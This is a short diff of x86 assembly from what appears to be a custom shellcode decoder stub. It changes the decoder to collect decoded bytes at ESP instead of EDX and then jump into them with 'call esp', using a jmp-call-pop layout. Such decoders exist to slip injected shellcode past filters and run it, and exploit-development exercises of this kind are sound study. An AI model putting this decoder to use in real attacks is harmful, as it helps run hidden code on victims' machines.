@@ -52,16 +52,16 @@ _decoder:
 	je short _runshellcode	; if we reach the exit marker, then we run the shellcode
 
 	;
-	; Collecting decoded shellcode in the EDX address
+	; Collecting decoded shellcode in the ESP address
 	;
-	mov byte [edx+ecx], al	; moving good byte to EDX
+	mov byte [esp+ecx], al	; moving good byte to ESP
 	inc ecx			; increase the counter
 
 	jmp short _decoder	; continuing
 
 
 _runshellcode:
-	call edx
+	call esp
 
 _down:
 	call _up		; ESP now has an address that points to the next instruction, however we are going UP
